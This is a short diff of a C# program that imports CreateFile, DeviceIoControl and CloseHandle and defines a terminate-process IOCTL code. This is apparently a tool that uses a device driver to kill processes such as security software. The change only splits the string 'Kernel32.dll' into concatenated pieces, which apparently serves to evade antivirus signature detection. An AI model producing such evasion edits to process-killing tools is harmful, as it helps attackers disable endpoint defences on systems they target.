@@ -4,15 +4,15 @@ class Program
 {
     private const uint TERMINATE_PROCESS_IOCTL_CODE = 0x22e044;
 
-    [DllImport("Kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
+    [DllImport("Ke"+"rn"+"el3"+"2.d"+"ll", CharSet = CharSet.Unicode, SetLastError = true)]
     private static extern IntPtr CreateFile(string fileName, uint desiredAccess, uint shareMode, IntPtr securityAttributes,
         uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);
 
-    [DllImport("Kernel32.dll", SetLastError = true)]
+    [DllImport("Ke"+"rn"+"el3"+"2.d"+"ll", SetLastError = true)]
     private static extern bool DeviceIoControl(IntPtr deviceHandle, uint ioctlCode, ref uint inputBuffer, uint inputBufferSize,
         ref uint outputBuffer, uint outputBufferSize, out uint bytesReturned, IntPtr overlapped);
 
-    [DllImport("Kernel32.dll", SetLastError = true)]
+    [DllImport("Ke"+"rn"+"el3"+"2.d"+"ll", SetLastError = true)]
     private static extern bool CloseHandle(IntPtr handle);
 
     static bool CheckProcess(uint processId)
